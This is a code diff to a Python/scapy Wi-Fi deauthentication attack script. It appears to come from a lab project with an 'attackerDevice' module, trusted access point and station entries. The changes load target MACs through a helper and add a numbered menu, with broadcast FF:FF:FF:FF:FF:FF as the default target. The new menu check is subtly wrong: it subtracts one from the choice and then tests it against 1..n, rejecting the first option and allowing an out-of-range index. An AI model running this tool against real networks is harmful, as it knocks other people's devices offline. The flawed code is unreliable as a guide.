@@ -1,13 +1,15 @@
 from scapy.all import *
 from scapy.layers.dot11 import *
 import os
+import attackerDevice.utils as utils
 
-with open("devices.json", "r") as file:
-    data = json.load(file)
+data = utils.load_json()
+#with open("devices.json", "r") as file:
+#    data = json.load(file)
 
 # MACS
-AP_MAC = data["TrustedAP"][0]["mac"]
-STA_MACS = [sta["mac"] for sta in data["STA"]]
+AP_MAC = utils.get_mac("TrustedAP")[0]
+STA_MACS = utils.get_mac("STA")
 
 def deauth_frame(target_mac):
     # Create a deauthentication frame
@@ -34,14 +36,21 @@ def start_deauthentication_frame_generator():
     while(use_defaults not in ["y", "n"]):
         use_defaults = input("Invalid input. Please enter 'y' for yes or 'n' for no: ")
     
+    mac_sta = None
     if use_defaults == "y":
-        STA_mac = "FF:FF:FF:FF:FF:FF"    
+        mac_sta = "FF:FF:FF:FF:FF:FF"    
     elif use_defaults == "n":
         print("specify which mac to deauthenticate: ")
-        print(STA_MACS)
-        STA_mac = input("Enter the STA MAC address: ")
+        for i in range(len(STA_MACS)):
+            print(f"{i+1}: {STA_MACS[i]}")
+        mac_choice = int(input("Enter the STA MAC option: "))-1
 
+        while mac_choice not in [i+1 for i in range(len(STA_MACS))]:
+            print("Invalid choice. Please enter a valid MAC option from the list.")
+            mac_choice = int(input("Enter the STA MAC option: "))-1
 
-    raw_frame = deauth_frame(STA_mac)
+        mac_sta = STA_MACS[mac_choice]
+
+    raw_frame = deauth_frame(mac_sta)
 
     return raw_frame
